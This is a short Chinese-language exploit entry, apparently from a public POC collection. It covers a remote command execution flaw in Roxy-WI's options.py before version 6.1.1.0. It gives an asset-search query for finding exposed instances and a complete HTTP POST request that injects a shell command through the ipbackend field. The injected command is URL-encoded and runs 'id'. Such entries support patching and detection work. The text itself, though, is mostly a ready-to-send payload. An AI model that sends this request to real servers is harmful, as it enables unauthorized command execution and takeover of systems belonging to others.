# Roxy-WI options.py远程命令执行漏洞

# 一、漏洞简介
`Roxy-WI`是开源的一款用于管理`Haproxy`、`Nginx`和`Keepalive`服务器的`Web`界面。`Roxy-WI 6.1.1.0`之前版本`options.py`接口存在远程命令执行漏洞，攻击者可以执行命令获取服务器权限。

# 二、影响版本
+ Roxy-WI 6.1.1.0之前

# 三、资产测绘
+ hunter`app.name="Roxy-WI"`
+ 登录页面


# 四、漏洞复现
```java
POST /app/options.py HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 82

alert_consumer=1&serv=127.0.0.1&ipbackend=%22%3Bid+%23%23&backend_server=127.0.0.1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rhpr1hfx80b04z1f>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
